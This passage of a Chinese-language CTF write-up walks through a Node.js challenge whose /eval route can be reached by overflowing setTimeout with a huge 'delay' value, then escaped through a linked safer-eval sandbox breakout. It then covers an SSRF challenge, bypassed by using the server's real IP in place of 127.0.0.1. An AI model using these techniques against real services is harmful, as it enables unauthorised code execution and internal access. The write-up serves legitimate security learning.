data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算 KPI&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/source&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;req&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; res&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Content-Type&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;text/javascript;charset=utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fs&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;readFileSync&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./index.js&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/version&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;req&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; res&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Content-Type&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;text/json;charset=utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fs&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;readFileSync&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./package.json&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;req&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; res&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Content-Type&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;text/html;charset=utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fs&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;readFileSync&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./index.html&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;listen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;0.0.0.0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Start listening&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;后面的部分都在首页面给出了，题目的核心在两个 eval 路由上，先看第一个&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;figcaption data-lang=&#34;JavaScript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;req&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; res&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token comment&#34;&gt;// 如果请求路径为 &#39;/eval&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;path &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/eval&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 设置延迟时间为 60 秒&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;let&lt;/span&gt; delay &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;60&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;delay&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 如果请求参数中有 delay 参数，则将延迟时间设置为 delay 参数的值和当前延迟时间的最大值&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Number&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;isInteger&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;parseInt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;query&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;delay&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      delay &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;delay&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;parseInt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;query&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;delay&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 设置一个定时器，延迟时间到期后执行 next () 函数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; t &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;setTimeout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; delay&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我 p 事&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 如果延迟时间过长，设置一个 1 秒的定时器，到期后清除之前设置的定时器，并返回 &#39;Timeout!&#39; 字符串&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;setTimeout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token function&#34;&gt;clearTimeout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;timeout&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Timeout!&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 如果请求路径不为 &#39;/eval&#39;，则执行 next () 函数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;简答来说就是通过 &lt;code&gt;/eval?delay=&lt;/code&gt;  上传一个数字并和 60000 比较，大的赋值给 delay&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;浏览器内部使用32位带符号的整数来储存推迟执行的时间这意味着setTimeout最多延迟2147483647秒（24.8天）。只要大于2147483647,就会发生溢出
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据版本找到一个 cve&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NvbW1lbnRob2wvc2FmZXItZXZhbC9pc3N1ZXMvMTA=&#34;&gt;Breakout · Issue #10 · commenthol/safer-eval (github.com)&lt;/span&gt;，直接用就行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051628984.png&#34; alt=&#34;image-20230405162804912&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;ez三剑客-ezweb&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ez三剑客-ezweb&#34;&gt;#&lt;/a&gt; EZ 三剑客 - EzWeb&lt;/h3&gt;
&lt;p&gt;看源码有一个 get 传参&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051629938.png&#34; alt=&#34;image-20230405162919887&#34; /&gt;&lt;/p&gt;
&lt;p&gt;访问&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051629926.png&#34; alt=&#34;image-20230405162928878&#34; /&gt;&lt;/p&gt;
&lt;p&gt;给了网卡信息，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS13d3ctMHYxZWw1YmM3cGkwMmIwNzBkLmJhaWR1LmNvbQ==&#34;&gt;在前段输入 www.baidu.com&lt;/span&gt;, 可以访问到这个页面。又是一个 ssrf&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051630056.png&#34; alt=&#34;image-20230405163052975&#34; /&gt;&lt;/p&gt;
&lt;p&gt;不让访问 127.0.0.1 但是可以使用真实 ip&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051636213.png&#34; alt=&#34;image-20230405163646133&#34; /&gt;&lt;/p&gt;
